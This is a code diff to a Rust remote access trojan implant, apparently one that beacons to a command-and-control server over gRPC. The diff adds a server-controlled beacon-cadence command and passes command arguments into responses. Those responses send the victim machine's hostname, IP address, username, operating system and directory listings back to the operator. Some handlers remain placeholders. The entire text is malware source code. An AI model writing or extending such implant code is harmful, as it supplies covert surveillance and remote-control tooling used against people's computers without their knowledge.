@@ -177,12 +177,15 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         let result = match command {
             RatCommand::Cadence => {
                 state.command_number += 1;
+                let seconds = response.arguments.parse::<u64>()?;
+                state.cadence = Duration::from_millis(seconds * 1000);
                 tonic::Request::new(
                     CommandResponse {
                         implant_id: state.implant_id.clone(),
                         timestamp: SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs(),
                         command: response.command,
-                        result: "PLACEHOLDER".to_string()
+                        arguments: response.arguments,
+                        result: format!("Beacon cadence changed")
                     },
                 )
             },
@@ -193,6 +196,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                         implant_id: state.implant_id.clone(),
                         timestamp: SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs(),
                         command: response.command,
+                        arguments: response.arguments,
                         result: get_directory_listing()
                     },
                 )
@@ -204,6 +208,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                         implant_id: state.implant_id.clone(),
                         timestamp: SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs(),
                         command: response.command,
+                        arguments: response.arguments,
                         result: get_hostname()
                     },
                 )
@@ -215,6 +220,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                         implant_id: state.implant_id.clone(),
                         timestamp: SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs(),
                         command: response.command,
+                        arguments: response.arguments,
                         result: get_ip_address()
                     },
                 )
@@ -226,6 +232,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                         implant_id: state.implant_id.clone(),
                         timestamp: SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs(),
                         command: response.command,
+                        arguments: response.arguments,
                         result: get_directory_listing()
                     },
                 )
@@ -244,6 +251,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                         implant_id: state.implant_id.clone(),
                         timestamp: SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs(),
                         command: response.command,
+                        arguments: response.arguments,
                         result: get_operating_system()
                     },
                 )
@@ -259,6 +267,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                         implant_id: state.implant_id.clone(),
                         timestamp: SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs(),
                         command: response.command,
+                        arguments: response.arguments,
                         result: "PLACEHOLDER".to_string()
                     },
                 )
@@ -270,6 +279,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                         implant_id: state.implant_id.clone(),
                         timestamp: SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs(),
                         command: response.command,
+                        arguments: response.arguments,
                         result: get_username()
                     },
                 )
@@ -281,6 +291,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                         implant_id: state.implant_id.clone(),
                         timestamp: SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs(),
                         command: response.command,
+                        arguments: response.arguments,
                         result: "Command received from server not implemented".to_string()
                     },
                 )
